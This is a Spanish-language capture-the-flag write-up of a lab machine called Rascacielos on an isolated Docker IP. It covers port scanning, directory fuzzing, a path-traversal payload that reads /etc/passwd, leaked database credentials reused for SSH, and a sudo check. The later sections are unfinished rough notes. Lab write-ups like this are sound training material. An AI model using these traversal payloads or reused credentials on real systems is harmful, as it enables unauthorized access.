# >_ [Rascacielos]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | Whoami-labs |
| **Dificultad** | 🟢 Fácil  |
| **OS** | Linux  |
| **IP de la Máquina** | `172.17.0.2` |
| **Fecha de resolución** | 2026-10-17 |

---

## 📝 Descripción
Máquina enfocada en la explotación de un servicio web vulnerable y posterior escalada de privilegios mediante abuso de permisos SUDO.

---

## 🔍 1. Fase de Reconocimiento y Enumeración

Comenzamos realizando un ping a la máquina, nos responde y su ttl es de 64, por lo que es una máquina Linux.
<img width="758" height="127" alt="ping" src="https://github.com/user-attachments/assets/26a7d6ec-85a3-471d-85f0-c24548294654" />
<br><br>

### Escaneo de Puertos (`nmap`)
Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:

```bash
sudo nmap -p- --open -n -Pn 172.17.0.2 -oN allPorts
```

**Resultados del escaneo:**
* **Puerto 22/TCP**: SSH
* **Puerto 80/TCP**: HTTP

<img width="982" height="221" alt="1Escaneo" src="https://github.com/user-attachments/assets/ea744281-009e-4843-93b5-8ddea0cb16d7" />
<br><br>


### Enumeración de servicios
Continuamos con un escaneo más profundo de los servicios encontrados:

```bash
sudo nmap -p 22,80 -sCV 172.17.0.2 -oN targeted
```

<img width="951" height="346" alt="2Escaneopuertos" src="https://github.com/user-attachments/assets/d81bb049-e791-48ee-ad82-df94946ff8b8" />
<br><br>
En el puerto 22 no hay ninguna vulnerabilidad y en el puerto 80 tenemos una página web con Apache 2.4.41, vamos a mirar primero la página web.


### Enumeración Web (Puerto 80)

Al inspeccionar el sitio web, nos encontramos con la página por defecto de Apache sin nada relevante, por lo que vamos a realizar fuzzing de directorios para buscar rutas ocultas.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/rockyou.txt  -x php,txt,html -t 100 -k -r
```

<img width="1277" height="631" alt="3gobuster" src="https://github.com/user-attachments/assets/1ca9a452-1f77-4501-ae11-1745c2afef70" />
<br><br>

Nos encuentra varias rutas, mientras sigue buscando más, vamos a ver index.php ya que aquí si que hay una web de Rascacielos Corp. 

<img width="1656" height="921" alt="4indexphp" src="https://github.com/user-attachments/assets/7cc90996-7ad1-41e0-bbd4-5bf4b43fcbdd" />
<br><br>

Miramos también footer.php por si hubiera algo, pero no hay nada relevante.
<img width="697" height="305" alt="5 skylinusuario" src="https://github.com/user-attachments/assets/c69ac383-71e8-4644-94ca-de09bd8d3e12" />
<br><br>



---

## 💥 2. Fase de Explotación (Acceso Inicial)

Al ir moviendonos por /index.php vemos que en la url se va añadiendo ?page=algo, podemos probar a leer archivos por si fueran accesibles para el usuario de apache, así que añadimos al final de la url: /index.php?page=../../../../../../../../../../etc/passwd


### Vector de Ataque

<img width="935" height="500" alt="7passwdd" src="https://github.com/user-attachments/assets/4f6a19e0-5219-461f-8385-1c5de41020af" />

curl -i 'http://172.17.0.2/index.php?page=../../../../../../../../etc/passwd'

<img width="1193" height="601" alt="8ueconcurl" src="https://github.com/user-attachments/assets/3d515164-bff2-44cf-95f6-a16483016bdb" />

Ubuntu 20.04.6 LTS
http://172.17.0.2/index.php?page=../../../../../../../../../../etc/issue

Volvemos a lanzar gobuster pero esta vez añadiendo alguna extensión más. Una vez finaliza vemos varios archivos nuevos que podemos ver, 

<img width="1427" height="766" alt="11info" src="https://github.com/user-attachments/assets/142a99c6-4617-4b2d-bdeb-07caa2c03d9c" />

Llama la atención .ba...

<img width="875" height="201" alt="11claves" src="https://github.com/user-attachments/assets/24366c2d-2cfd-4a73-b390-4e8138675271" />

Hay usuario y contra...
<?php
// Configuración de base de datos — NO EXPONER
$db_host = "localhost";
$db_user = "admin";
$db_pass = "Sky2026!";
$db_name = "rascacielos_db";

// Credenciales sistema interno
$admin_pass = "Sky2026!";
?>


Como teníamos el puerto 22 y un usuario válido pero sin contraseña, vmaos aprobar a entrar....

gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/common.txt  -x php,bak,html

<img width="788" height="474" alt="12reutilizacioncontrasenia" src="https://github.com/user-attachments/assets/85ba70ea-0e7e-49e9-a949-5205d5b38f81" />
bbdd n odeja pero ssh si,reutilizacion de contraseña
architect


## 👑 3. Escalada de Privilegios

### Enumeración del Sistema

<img width="1149" height="143" alt="13findsudo" src="https://github.com/user-attachments/assets/d5e9a683-30c6-411f-a3ff-1cfa5f255d64" />


```bash
# Comprobamos privilegios de SUDO
sudo -l
```



---

### Explotación del Vector de Escalada


<img width="654" height="189" alt="14fin" src="https://github.com/user-attachments/assets/b1109391-a3b5-474f-9c70-9eb513aa77a1" />

<img width="485" height="151" alt="15d" src="https://github.com/user-attachments/assets/edf15ac4-761c-43ad-805c-4e3189d40180" />


<img width="707" height="572" alt="15ole" src="https://github.com/user-attachments/assets/9c9d408b-03fa-4c28-a342-ac3030971bc8" />

